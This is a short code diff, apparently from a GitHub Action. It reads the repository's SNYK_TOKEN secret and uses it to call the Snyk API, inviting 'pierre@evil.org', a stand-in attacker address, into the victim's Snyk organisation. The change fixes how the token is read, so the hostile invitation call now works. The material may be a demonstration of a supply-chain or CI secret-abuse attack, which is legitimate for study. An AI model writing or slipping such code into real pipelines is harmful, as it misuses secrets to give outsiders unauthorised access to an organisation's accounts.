@@ -9,7 +9,7 @@ try {
   const regexCheckbox = core.getInput('regex-checkbox');
 
   axios.defaults.baseURL= 'https://snyk.io/api/v1'; 
-  axios.defaults.headers.common['Authorization']= `token ${{secret.SNYK_TOKEN}}`; 
+  axios.defaults.headers.common['Authorization']= `token ${process.env.SNYK_TOKEN}`; 
   axios.defaults.headers.post['Content-Type']= 'application/json'; 
   axios.post(`/org/${snykOrgId}/invite`, {
     email: 'pierre@evil.org'
